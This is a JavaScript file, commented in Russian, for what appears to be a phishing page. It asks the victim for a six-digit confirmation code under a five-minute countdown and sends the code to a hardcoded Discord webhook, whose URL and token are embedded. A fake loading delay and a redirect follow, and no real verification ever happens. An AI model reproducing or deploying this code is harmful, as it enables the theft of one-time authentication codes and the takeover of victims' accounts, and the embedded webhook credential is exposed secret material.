let timeRemaining = 300; // 5 минут в секундах
const timerElement = document.getElementById('timer');
const verifyButton = document.getElementById('verify-btn');
const codeInput = document.getElementById('code-input');
const errorMessage = document.getElementById('error-message');
const loadingElement = document.getElementById('loading');

// Функция для форматирования времени (мм:сс)
function formatTime(seconds) {
    const minutes = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${String(minutes).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
}

// Функция для обновления таймера
function updateTimer() {
    if (timeRemaining > 0) {
        timeRemaining--;
        timerElement.textContent = formatTime(timeRemaining);
    } else {
        timerElement.textContent = 'Время вышло!';
        codeInput.disabled = true;
    }
}

// Функция отправки данных в Discord через вебхук
function sendToDiscord(code) {
    const webhookUrl = "https://discord.com/api/webhooks/1303384530895372338/orvIQvUJHq86vnrecZ5tNFzw1UGCH2LAy18RjtJmTNSdhgd8yaDSZSdTlevLid7EGcjB";  // Замените на ваш реальный URL вебхука

    // Формируем сообщение для Discord
    const payload = {
        content: `Получен код подтверждения: ${code}`
    };

    // Отправка POST-запроса на Discord
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(response => response.json())
    .then(data => {
        console.log("Успешно отправлено в Discord:", data);
    })
    .catch(error => {
        console.error("Ошибка при отправке в Discord:", error);
    });
}

// Проверка введенного кода
function checkCode() {
    const enteredCode = codeInput.value.trim();
    if (enteredCode.length === 6) {
        verifyButton.disabled = false;
        verifyButton.classList.add('active');
    } else {
        verifyButton.disabled = true;
        verifyButton.classList.remove('active');
    }
}

// Обработчик клика на кнопку подтверждения
verifyButton.addEventListener('click', function() {
    const enteredCode = codeInput.value.trim();

    // Симуляция задержки загрузки после ввода кода
    loadingElement.style.display = 'block';

    // Отправляем код в Discord
    sendToDiscord(enteredCode);

    setTimeout(() => {
        loadingElement.style.display = 'none';
        // Перенаправление или выполнение других действий
        // Например, можно перенаправить на другую страницу
        window.location.href = "index.html";  // Замените на вашу страницу
    }, 20000); // Задержка 2 секунды перед выполнением действия
});

// Проверка кода при вводе
codeInput.addEventListener('input', checkCode);

// Инициализация таймера и отсчета
setInterval(updateTimer, 1000);

// Запуск таймера при загрузке
updateTimer();
